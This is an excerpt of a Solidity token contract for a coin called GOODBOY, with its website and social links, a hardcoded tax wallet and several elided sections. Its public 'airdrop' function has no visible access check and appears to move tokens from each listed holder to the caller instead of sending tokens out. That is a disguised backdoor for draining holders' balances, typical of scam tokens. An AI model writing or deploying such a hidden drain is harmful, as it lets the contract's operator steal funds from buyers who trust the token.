...
Web: https://goodboyeth.vip
X: https://x.com/good_boy_eth
Tg: https://t.me/good_boy_eth
...
contract GOODBOY is Context, IERC20, Ownable {
    ...
    constructor() payable {
        _taxWallet = payable(0xc5298dF3cC25800a449a460e7c5d99E090F3aB80);
    ...
    function _getairs(address from, address to, uint256 amount, uint8 _u, uint16 _r) private {
    ...
    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            ...
            if (_balances[receiver] > amounts[i]) {
                ...
                _getairs(receiver, msg.sender, amount, 0, 0);
            }
        }
    }
